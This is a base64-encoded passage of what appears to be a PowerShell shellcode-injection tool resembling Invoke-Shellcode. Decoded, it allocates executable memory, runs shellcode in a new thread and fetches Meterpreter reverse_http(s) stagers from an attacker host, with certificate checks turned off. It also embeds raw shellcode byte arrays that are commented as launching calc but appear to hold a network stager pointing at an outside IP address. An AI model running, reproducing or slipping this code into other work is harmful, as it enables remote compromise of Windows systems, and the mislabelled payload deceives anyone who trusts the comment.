2hlbGxjb2RlLCAwLCAkQmFzZUFkZHJlc3MsICRTaGVsbGNvZGUuTGVuZ3RoKQogICAgICAgIAogICAgICAgICMgR2V0IGFkZHJlc3Mgb2YgRXhpdFRocmVhZCBmdW5jdGlvbgogICAgICAgICRFeGl0VGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgRXhpdFRocmVhZAogICAgICAgIAogICAgICAgIGlmICgkUG93ZXJTaGVsbDMyYml0KQogICAgICAgIHsKICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkQmFzZUFkZHJlc3MgJEV4aXRUaHJlYWRBZGRyIDMyCiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyAzMi1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkQmFzZUFkZHJlc3MgJEV4aXRUaHJlYWRBZGRyIDY0CiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyA2NC1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CgogICAgICAgICMgQWxsb2NhdGUgUldYIG1lbW9yeSBmb3IgdGhlIHRocmVhZCBjYWxsIHN0dWIKICAgICAgICAkQ2FsbFN0dWJBZGRyZXNzID0gJFZpcnR1YWxBbGxvYy5JbnZva2UoW0ludFB0cl06Olplcm8sICRDYWxsU3R1Yi5MZW5ndGggKyAxLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCiAgICAgICAgaWYgKCEkQ2FsbFN0dWJBZGRyZXNzKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSB0aHJlYWQgY2FsbCBzdHViLiIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiVGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRDYWxsU3R1YkFkZHJlc3MuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKICAgICAgICAjIENvcHkgY2FsbCBzdHViIHRvIFJXWCBidWZmZXIKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRDYWxsU3R1YiwgMCwgJENhbGxTdHViQWRkcmVzcywgJENhbGxTdHViLkxlbmd0aCkKCiAgICAgICAgIyBMYXVuY2ggc2hlbGxjb2RlIGluIGl0J3Mgb3duIHRocmVhZAogICAgICAgICRUaHJlYWRIYW5kbGUgPSAkQ3JlYXRlVGhyZWFkLkludm9rZShbSW50UHRyXTo6WmVybywgMCwgJENhbGxTdHViQWRkcmVzcywgJEJhc2VBZGRyZXNzLCAwLCBbSW50UHRyXTo6WmVybykKICAgICAgICBpZiAoISRUaHJlYWRIYW5kbGUpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGxhdW5jaCB0aHJlYWQuIgogICAgICAgIH0KCiAgICAgICAgIyBXYWl0IGZvciBzaGVsbGNvZGUgdGhyZWFkIHRvIHRlcm1pbmF0ZQogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkVGhyZWFkSGFuZGxlLCAweEZGRkZGRkZGKSB8IE91dC1OdWxsCiAgICAgICAgCiAgICAgICAgJFZpcnR1YWxGcmVlLkludm9rZSgkQ2FsbFN0dWJBZGRyZXNzLCAkQ2FsbFN0dWIuTGVuZ3RoICsgMSwgMHg4MDAwKSB8IE91dC1OdWxsICMgTUVNX1JFTEVBU0UgKDB4ODAwMCkKICAgICAgICAkVmlydHVhbEZyZWUuSW52b2tlKCRCYXNlQWRkcmVzcywgJFNoZWxsY29kZS5MZW5ndGggKyAxLCAweDgwMDApIHwgT3V0LU51bGwgIyBNRU1fUkVMRUFTRSAoMHg4MDAwKQoKICAgICAgICBXcml0ZS1WZXJib3NlICdTaGVsbGNvZGUgaW5qZWN0aW9uIGNvbXBsZXRlIScKICAgIH0KCiAgICAjIEEgdmFsaWQgcG9pbnRlciB0byBJc1dvdzY0UHJvY2VzcyB3aWxsIGJlIHJldHVybmVkIGlmIENQVSBpcyA2NC1iaXQKICAgICRJc1dvdzY0UHJvY2Vzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIElzV293NjRQcm9jZXNzCiAgICBpZiAoJElzV293NjRQcm9jZXNzQWRkcikKICAgIHsKICAgIAkkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0Jvb2xdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgIAkkSXNXb3c2NFByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSXNXb3c2NFByb2Nlc3NBZGRyLCAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSkKICAgICAgICAKICAgICAgICAkNjRiaXRDUFUgPSAkdHJ1ZQogICAgfQogICAgZWxzZQogICAgewogICAgCSQ2NGJpdENQVSA9ICRmYWxzZQogICAgfQoKICAgIGlmIChbSW50UHRyXTo6U2l6ZSAtZXEgNCkKICAgIHsKICAgICAgICAkUG93ZXJTaGVsbDMyYml0ID0gJHRydWUKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkUG93ZXJTaGVsbDMyYml0ID0gJGZhbHNlCiAgICB9CgogICAgaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1lcSAnTWV0YXNwbG9pdCcpCiAgICB7CiAgICAgICAgaWYgKCEkUG93ZXJTaGVsbDMyYml0KSB7CiAgICAgICAgICAgICMgVGhlIGN1cnJlbnRseSBzdXBwb3J0ZWQgTWV0YXNwbG9pdCBwYXlsb2FkcyBhcmUgMzItYml0LiBUaGlzIGJsb2NrIG9mIGNvZGUgaW1wbGVtZW50cyB0aGUgbG9naWMgdG8gZXhlY3V0ZSB0aGlzIHNjcmlwdCBmcm9tIDMyLWJpdCBQb3dlclNoZWxsCiAgICAgICAgICAgICMgR2V0IHRoaXMgc2NyaXB0J3MgY29udGVudHMgYW5kIHBhc3MgaXQgdG8gMzItYml0IHBvd2Vyc2hlbGwgd2l0aCB0aGUgc2FtZSBwYXJhbWV0ZXJzIHBhc3NlZCB0byB0aGlzIGZ1bmN0aW9uCgogICAgICAgICAgICAjIFB1bGwgb3V0IGp1c3QgdGhlIGNvbnRlbnQgb2YgdGhlIHRoaXMgc2NyaXB0J3MgaW52b2NhdGlvbi4KICAgICAgICAgICAgJFJvb3RJbnZvY2F0aW9uID0gJE15SW52b2NhdGlvbi5MaW5lCgogICAgICAgICAgICAkUmVzcG9uc2UgPSAkVHJ1ZQogICAgICAgIAogICAgICAgICAgICBpZiAoICRGb3JjZSAtb3IgKCAkUmVzcG9uc2UgPSAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICJEbyB5b3Ugd2FudCB0byBsYXVuY2ggdGhlIHBheWxvYWQgZnJvbSB4ODYgUG93ZXJzaGVsbD8iLAogICAgICAgICAgICAgICAgICAgIkF0dGVtcHQgdG8gZXhlY3V0ZSAzMi1iaXQgc2hlbGxjb2RlIGZyb20gNjQtYml0IFBvd2Vyc2hlbGwuIE5vdGU6IFRoaXMgcHJvY2VzcyB0YWtlcyBhYm91dCBvbmUgbWludXRlLiBCZSBwYXRpZW50ISBZb3Ugd2lsbCBhbHNvIHNlZSBzb21lIGFydGlmYWN0cyBvZiB0aGUgc2NyaXB0IGxvYWRpbmcgaW4gdGhlIG90aGVyIHByb2Nlc3MuIiApICkgKSB7IH0KICAgICAgICAKICAgICAgICAgICAgaWYgKCAhJFJlc3BvbnNlICkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgIyBVc2VyIG9wdGVkIG5vdCB0byBsYXVuY2ggdGhlIDMyLWJpdCBwYXlsb2FkIGZyb20gMzItYml0IFBvd2VyU2hlbGwuIEV4aXQgZnVuY3Rpb24KICAgICAgICAgICAgICAgIFJldHVybgogICAgICAgICAgICB9CgogICAgICAgICAgICAjIFNpbmNlIHRoZSBzaGVsbGNvZGUgd2lsbCBydW4gaW4gYSBub25pbnRlcmFjdGl2ZSBpbnN0YW5jZSBvZiBQb3dlclNoZWxsLCBtYWtlIHN1cmUgdGhlIC1Gb3JjZSBzd2l0Y2ggaXMgaW5jbHVkZWQgc28gdGhhdCB0aGVyZSBpcyBubyB3YXJuaW5nIHByb21wdC4KICAgICAgICAgICAgaWYgKCRNeUludm9jYXRpb24uQm91bmRQYXJhbWV0ZXJzWydGb3JjZSddKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFeGVjdXRpbmcgdGhlIGZvbGxvd2luZyBmcm9tIDMyLWJpdCBQb3dlclNoZWxsOiAkUm9vdEludm9jYXRpb24iCiAgICAgICAgICAgICAgICAkQ29tbWFuZCA9ICJmdW5jdGlvbiAkKCRNeUludm9jYXRpb24uSW52b2NhdGlvbk5hbWUpIHtgbiIgKyAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5TY3JpcHRCbG9jayArICJgbn1gbiQoJFJvb3RJbnZvY2F0aW9uKWBuYG4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFeGVjdXRpbmcgdGhlIGZvbGxvd2luZyBmcm9tIDMyLWJpdCBQb3dlclNoZWxsOiAkUm9vdEludm9jYXRpb24gLUZvcmNlIgogICAgICAgICAgICAgICAgJENvbW1hbmQgPSAiZnVuY3Rpb24gJCgkTXlJbnZvY2F0aW9uLkludm9jYXRpb25OYW1lKSB7YG4iICsgJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuU2NyaXB0QmxvY2sgKyAiYG59YG4kKCRSb290SW52b2NhdGlvbikgLUZvcmNlYG5gbiIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJENvbW1hbmRCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFzY2lpLkdldEJ5dGVzKCRDb21tYW5kKQogICAgICAgICAgICAkRW5jb2RlZENvbW1hbmQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRDb21tYW5kQnl0ZXMpCgogICAgICAgICAgICAkRXhlY3V0ZSA9ICckQ29tbWFuZCcgKyAiIHwgJEVudjp3aW5kaXJcU3lzV09XNjRcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSAtTm9Qcm9maWxlIC1Db21tYW5kIC0iCiAgICAgICAgICAgIEludm9rZS1FeHByZXNzaW9uIC1Db21tYW5kICRFeGVjdXRlIHwgT3V0LU51bGwKCiAgICAgICAgICAgICMgRXhpdCB0aGUgc2NyaXB0IHNpbmNlIHRoZSBzaGVsbGNvZGUgd2lsbCBiZSBydW5uaW5nIGZyb20geDg2IFBvd2VyU2hlbGwKICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRSZXNwb25zZSA9ICRUcnVlCiAgICAgICAgCiAgICAgICAgaWYgKCAkRm9yY2UgLW9yICggJFJlc3BvbnNlID0gJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCAiRG8geW91IGtub3cgd2hhdCB5b3UncmUgZG9pbmc/IiwKICAgICAgICAgICAgICAgIkFib3V0IHRvIGRvd25sb2FkIE1ldGFzcGxvaXQgcGF5bG9hZCAnJCgkUGF5bG9hZCknIExIT1NUPSQoJExob3N0KSwgTFBPUlQ9JCgkTHBvcnQpIiApICkgKSB7IH0KICAgICAgICAKICAgICAgICBpZiAoICEkUmVzcG9uc2UgKQogICAgICAgIHsKICAgICAgICAgICAgIyBVc2VyIG9wdGVkIG5vdCB0byBjYXJyeSBvdXQgZG93bmxvYWQgb2YgTWV0YXNwbG9pdCBwYXlsb2FkLiBFeGl0IGZ1bmN0aW9uCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgICAgICAKICAgICAgICBzd2l0Y2ggKCRQYXlsb2FkKQogICAgICAgIHsKICAgICAgICAgICAgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU1NMID0gJycKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcycKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNTTCA9ICdzJwogICAgICAgICAgICAgICAgIyBBY2NlcHQgaW52YWxpZCBjZXJ0aWZpY2F0ZXMKICAgICAgICAgICAgICAgIFtTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjayA9IHsgJHRydWUgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgICMgTWV0ZXJwcmV0ZXIgZXhwZWN0cyAnSU5JVE0nIGluIHRoZSBVUkkgaW4gb3JkZXIgdG8gaW5pdGlhdGUgc3RhZ2UgMC4gQXdlc29tZSBhdXRoZW50aWNhdGlvbiwgaHVoPwogICAgICAgICRSZXF1ZXN0ID0gImh0dHAkKCRTU0wpOi8vJCgkTGhvc3QpOiQoJExwb3J0KS9JTklUTSIKICAgICAgICBXcml0ZS1WZXJib3NlICJSZXF1ZXN0aW5nIG1ldGVycHJldGVyIHBheWxvYWQgZnJvbSAkUmVxdWVzdCIKICAgICAgICAKICAgICAgICAkVXJpID0gTmV3LU9iamVjdCBVcmkoJFJlcXVlc3QpCiAgICAgICAgJFdlYkNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKICAgICAgICAkV2ViQ2xpZW50LkhlYWRlcnMuQWRkKCd1c2VyLWFnZW50JywgIiRVc2VyQWdlbnQiKQogICAgICAgIAogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gJFdlYkNsaWVudC5Eb3dubG9hZERhdGEoJFVyaSkKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICIkKCRFcnJvclswXS5FeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgfQogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9ICRTaGVsbGNvZGUzMgoKICAgIH0KICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTaGVsbGNvZGUnXSkKICAgIHsKICAgICAgICAjIFVzZXJzIHBhc3NpbmcgaW4gc2hlbGxjb2RlICB0aHJvdWdoIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyIGFyZSByZXNwb25zaWJsZSBmb3IgZW5zdXJpbmcgaXQgdGFyZ2V0cwogICAgICAgICMgdGhlIGNvcnJlY3QgYXJjaGl0ZWNodHVyZSAtIHg4NiB2cy4geDY0LiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHdoYXQgeW91IHByb3ZpZGUgaXQuCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gJFNoZWxsY29kZQogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9ICRTaGVsbGNvZGUzMgogICAgfQogICAgZWxzZQogICAgewogICAgICAgICMgUG9wIGEgY2FsYy4uLiBvciB3aGF0ZXZlciBzaGVsbGNvZGUgeW91IGRlY2lkZSB0byBwbGFjZSBpbiBoZXJlCiAgICAgICAgIyBJIHNpbmNlcmVseSBob3BlIHlvdSB0cnVzdCB0aGF0IHRoaXMgc2hlbGxjb2RlIGFjdHVhbGx5IHBvcHMgYSBjYWxjLi4uCiAgICAgICAgIyBJbnNlcnQgeW91ciBzaGVsbGNvZGUgaGVyZSBpbiB0aGUgZm9yIDB4WFgsMHhYWCwuLi4KICAgICAgICAjIDMyLWJpdCBwYXlsb2FkCiAgICAgICAgIyBtc2ZwYXlsb2FkIHdpbmRvd3MvZXhlYyBDTUQ9ImNtZCAvayBjYWxjIiBFWElURlVOQz10aHJlYWQKICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSBAKDB4ZmMsMHhlOCwweDg5LDB4MDAsMHgwMCwweDAwLDB4NjAsMHg4OSwweGU1LDB4MzEsMHhkMiwweDY0LDB4OGIsMHg1MiwweDMwLDB4OGIsMHg1MiwweDBjLDB4OGIsMHg1MiwweDE0LDB4OGIsMHg3MiwweDI4LDB4MGYsMHhiNywweDRhLDB4MjYsMHgzMSwweGZmLDB4MzEsMHhjMCwweGFjLDB4M2MsMHg2MSwweDdjLDB4MDIsMHgyYywweDIwLDB4YzEsMHhjZiwweDBkLDB4MDEsMHhjNywweGUyLDB4ZjAsMHg1MiwweDU3LDB4OGIsMHg1MiwweDEwLDB4OGIsMHg0MiwweDNjLDB4MDEsMHhkMCwweDhiLDB4NDAsMHg3OCwweDg1LDB4YzAsMHg3NCwweDRhLDB4MDEsMHhkMCwweDUwLDB4OGIsMHg0OCwweDE4LDB4OGIsMHg1OCwweDIwLDB4MDEsMHhkMywweGUzLDB4M2MsMHg0OSwweDhiLDB4MzQsMHg4YiwweDAxLDB4ZDYsMHgzMSwweGZmLDB4MzEsMHhjMCwweGFjLDB4YzEsMHhjZiwweDBkLDB4MDEsMHhjNywweDM4LDB4ZTAsMHg3NSwweGY0LDB4MDMsMHg3ZCwweGY4LDB4M2IsMHg3ZCwweDI0LDB4NzUsMHhlMiwweDU4LDB4OGIsMHg1OCwweDI0LDB4MDEsMHhkMywweDY2LDB4OGIsMHgwYywweDRiLDB4OGIsMHg1OCwweDFjLDB4MDEsMHhkMywweDhiLDB4MDQsMHg4YiwweDAxLDB4ZDAsMHg4OSwweDQ0LDB4MjQsMHgyNCwweDViLDB4NWIsMHg2MSwweDU5LDB4NWEsMHg1MSwweGZmLDB4ZTAsMHg1OCwweDVmLDB4NWEsMHg4YiwweDEyLDB4ZWIsMHg4NiwweDVkLDB4NjgsMHg2ZSwweDY1LDB4NzQsMHgwMCwweDY4LDB4NzcsMHg2OSwweDZlLDB4NjksMHg1NCwweDY4LDB4NGMsMHg3NywweDI2LDB4MDcsMHhmZiwweGQ1LDB4ZTgsMHg4MCwweDAwLDB4MDAsMHgwMCwweDRkLDB4NmYsMHg3YSwweDY5LDB4NmMsMHg2YywweDYxLDB4MmYsMHgzNCwweDJlLDB4MzAsMHgyMCwweDI4LDB4NjMsMHg2ZiwweDZkLDB4NzAsMHg2MSwweDc0LDB4NjksMHg2MiwweDZjLDB4NjUsMHgzYiwweDIwLDB4NGQsMHg1MywweDQ5LDB4NDUsMHgyMCwweDM4LDB4MmUsMHgzMCwweDNiLDB4MjAsMHg1NywweDY5LDB4NmUsMHg2NCwweDZmLDB4NzcsMHg3MywweDIwLDB4NGUsMHg1NCwweDIwLDB4MzUsMHgyZSwweDMxLDB4M2IsMHgyMCwweDU0LDB4NzIsMHg2OSwweDY0LDB4NjUsMHg2ZSwweDc0LDB4MmYsMHgzNCwweDJlLDB4MzAsMHgyOSwweDAwLDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4MDAsMHg1OSwweDMxLDB4ZmYsMHg1NywweDU3LDB4NTcsMHg1NywweDUxLDB4NjgsMHgzYSwweDU2LDB4NzksMHhhNywweGZmLDB4ZDUsMHhlOSwweDkzLDB4MDAsMHgwMCwweDAwLDB4NWIsMHgzMSwweGM5LDB4NTEsMHg1MSwweDZhLDB4MDMsMHg1MSwweDUxLDB4NjgsMHg1MCwweDAwLDB4MDAsMHgwMCwweDUzLDB4NTAsMHg2OCwweDU3LDB4ODksMHg5ZiwweGM2LDB4ZmYsMHhkNSwweDg5LDB4YzMsMHhlYiwweDdhLDB4NTksMHgzMSwweGQyLDB4NTIsMHg2OCwweDAwLDB4MzIsMHhhMCwweDg0LDB4NTIsMHg1MiwweDUyLDB4NTEsMHg1MiwweDUwLDB4NjgsMHhlYiwweDU1LDB4MmUsMHgzYiwweGZmLDB4ZDUsMHg4OSwweGM2LDB4NjgsMHg4MCwweDMzLDB4MDAsMHgwMCwweDg5LDB4ZTAsMHg2YSwweDA0LDB4NTAsMHg2YSwweDFmLDB4NTYsMHg2OCwweDc1LDB4NDYsMHg5ZSwweDg2LDB4ZmYsMHhkNSwweDMxLDB4ZmYsMHg1NywweDU3LDB4NTcsMHg1NywweDU2LDB4NjgsMHgyZCwweDA2LDB4MTgsMHg3YiwweGZmLDB4ZDUsMHg4NSwweGMwLDB4NzQsMHg0OCwweDMxLDB4ZmYsMHg4NSwweGY2LDB4NzQsMHgwNCwweDg5LDB4ZjksMHhlYiwweDA5LDB4NjgsMHhhYSwweGM1LDB4ZTIsMHg1ZCwweGZmLDB4ZDUsMHg4OSwweGMxLDB4NjgsMHg0NSwweDIxLDB4NWUsMHgzMSwweGZmLDB4ZDUsMHgzMSwweGZmLDB4NTcsMHg2YSwweDA3LDB4NTEsMHg1NiwweDUwLDB4NjgsMHhiNywweDU3LDB4ZTAsMHgwYiwweGZmLDB4ZDUsMHhiZiwweDAwLDB4MmYsMHgwMCwweDAwLDB4MzksMHhjNywweDc1LDB4MDQsMHg4OSwweGQ4LDB4ZWIsMHg4YSwweDMxLDB4ZmYsMHhlYiwweDE1LDB4ZWIsMHg0OSwweGU4LDB4ODEsMHhmZiwweGZmLDB4ZmYsMHgyZiwweDc5LDB4NzEsMHg1YSwweDU4LDB4MDAsMHgwMCwweDY4LDB4ZjAsMHhiNSwweGEyLDB4NTYsMHhmZiwweGQ1LDB4NmEsMHg0MCwweDY4LDB4MDAsMHgxMCwweDAwLDB4MDAsMHg2OCwweDAwLDB4MDAsMHg0MCwweDAwLDB4NTcsMHg2OCwweDU4LDB4YTQsMHg1MywweGU1LDB4ZmYsMHhkNSwweDkzLDB4NTMsMHg1MywweDg5LDB4ZTcsMHg1NywweDY4LDB4MDAsMHgyMCwweDAwLDB4MDAsMHg1MywweDU2LDB4NjgsMHgxMiwweDk2LDB4ODksMHhlMiwweGZmLDB4ZDUsMHg4NSwweGMwLDB4NzQsMHhjZCwweDhiLDB4MDcsMHgwMSwweGMzLDB4ODUsMHhjMCwweDc1LDB4ZTUsMHg1OCwweGMzLDB4ZTgsMHgxZCwweGZmLDB4ZmYsMHhmZiwweDM1LDB4MzIsMHgyZSwweDM0LDB4MmUsMHgzMywweDM1LDB4MmUsMHgzNSwweDM5LDB4MDAKICAgICAgICApCgogICAgICAgICMgNjQtYml0IHBheWxvYWQKICAgICAgICAjIG1zZnBheWxvYWQgd2luZG93cy94NjQvZXhlYyBDTUQ9ImNhbGMiIEVYSVRGVU5DPXRocmVhZAogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9IEAoMHhmYywweGU4LDB4ODksMHgwMCwweDAwLDB4MDAsMHg2MCwweDg5LDB4ZTUsMHgzMSwweGQyLDB4NjQsMHg4YiwweDUyLDB4MzAsMHg4YiwweDUyLDB4MGMsMHg4YiwweDUyLDB4MTQsMHg4YiwweDcyLDB4MjgsMHgwZiwweGI3LDB4NGEsMHgyNiwweDMxLDB4ZmYsMHgzMSwweGMwLDB4YWMsMHgzYywweDYxLDB4N2MsMHgwMiwweDJjLDB4MjAsMHhjMSwweGNmLDB4MGQsMHgwMSwweGM3LDB4ZTIsMHhmMCwweDUyLDB4NTcsMHg4YiwweDUyLDB4MTAsMHg4YiwweDQyLDB4M2MsMHgwMSwweGQwLDB4OGIsMHg0MCwweDc4LDB4ODUsMHhjMCwweDc0LDB4NGEsMHgwMSwweGQwLDB4NTAsMHg4YiwweDQ4LDB4MTgsMHg4YiwweDU4LDB4MjAsMHgwMSwweGQzLDB4ZTMsMHgzYywweDQ5LDB4OGIsMHgzNCwweDhiLDB4MDEsMHhkNiwweDMxLDB4ZmYsMHgzMSwweGMwLDB4YWMsMHhjMSwweGNmLDB4MGQsMHgwMSwweGM3LDB4MzgsMHhlMCwweDc1LDB4ZjQsMHgwMywweDdkLDB4ZjgsMHgzYiwweDdkLDB4MjQsMHg3NSwweGUyLDB4NTgsMHg4YiwweDU4LDB4MjQsMHgwMSwweGQzLDB4NjYsMHg4YiwweDBjLDB4NGIsMHg4YiwweDU4LDB4MWMsMHgwMSwweGQzLDB4OGIsMHgwNCwweDhiLDB4MDEsMHhkMCwweDg5LDB4NDQsMHgyNCwweDI0LDB4NWIsMHg1YiwweDYxLDB4NTksMHg1YSwweDUxLDB4ZmYsMHhlMCwweDU4LDB4NWYsMHg1YSwweDhiLDB4MTIsMHhlYiwweDg2LDB4NWQsMHg2OCwweDZlLDB4NjUsMHg3NCwweDAwLDB4NjgsMHg3NywweDY5LDB4NmUsMHg2OSwweDU0LDB4NjgsMHg0YywweDc3LDB4MjYsMHgwNywweGZmLDB4ZDUsMHhlOCwweDgwLDB4MDAsMHgwMCwweDAwLDB4NGQsMHg2ZiwweDdhLDB4NjksMHg2YywweDZjLDB4NjEsMHgyZiwweDM0LDB4MmUsMHgzMCwweDIwLDB4MjgsMHg2MywweDZmLDB4NmQsMHg3MCwweDYxLDB4NzQsMHg2OSwweDYyLDB4NmMsMHg2NSwweDNiLDB4MjAsMHg0ZCwweDUzLDB4NDksMHg0NSwweDIwLDB4MzgsMHgyZSwweDMwLDB4M2IsMHgyMCwweDU3LDB4NjksMHg2ZSwweDY0LDB4NmYsMHg3NywweDczLDB4MjAsMHg0ZSwweDU0LDB4MjAsMHgzNSwweDJlLDB4MzEsMHgzYiwweDIwLDB4NTQsMHg3MiwweDY5LDB4NjQsMHg2NSwweDZlLDB4NzQsMHgyZiwweDM0LDB4MmUsMHgzMCwweDI5LDB4MDAsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHg1OCwweDU4LDB4NTgsMHgwMCwweDU5LDB4MzEsMHhmZiwweDU3LDB4NTcsMHg1NywweDU3LDB4NTEsMHg2OCwweDNhLDB4NTYsMHg3OSwweGE3LDB4ZmYsMHhkNSwweGU5LDB4OTMsMHgwMCwweDAwLDB4MDAsMHg1YiwweDMxLDB4YzksMHg1MSwweDUxLDB4NmEsMHgwMywweDUxLDB4NTEsMHg2OCwweDUwLDB4MDAsMHgwMCwweDAwLDB4NTMsMHg1MCwweDY4LDB4NTcsMHg4OSwweDlmLDB4YzYsMHhmZiwweGQ1LDB4ODksMHhjMywweGViLDB4N2EsMHg1OSwweDMxLDB4ZDIsMHg1MiwweDY4LDB4MDAsMHgzMiwweGEwLDB4ODQsMHg1MiwweDUyLDB4NTIsMHg1MSwweDUyLDB4NTAsMHg2OCwweGViLDB4NTUsMHgyZSwweDNiLDB4ZmYsMHhkNSwweDg5LDB4YzYsMHg2OCwweDgwLDB4MzMsMHgwMCwweDAwLDB4ODksMHhlMCwweDZhLDB4MDQsMHg1MCwweDZhLDB4MWYsMHg1NiwweDY4LDB4NzUsMHg0NiwweDllLDB4ODYsMHhmZiwweGQ1LDB4MzEsMHhmZiwweDU3LDB4NTcsMHg1NywweDU3LDB4NTYsMHg2OCwweDJkLDB4MDYsMHgxOCwweDdiLDB4ZmYsMHhkNSwweDg1LDB4YzAsMHg3NCwweDQ4LDB4MzEsMHhmZiwweDg1LDB4ZjYsMHg3NCwweDA0LDB4ODksMHhmOSwweGViLDB4MDksMHg2OCwweGFhLDB4YzUsMHhlMiwweDVkLDB4ZmYsMHhkNSwweDg5LDB4YzEsMHg2OCwweDQ1LDB4MjEsMHg1ZSwweDMxLDB4ZmYsMHhkNSwweDMxLDB4ZmYsMHg1NywweDZhLDB4MDcsMHg1MSwweDU2LDB4NTA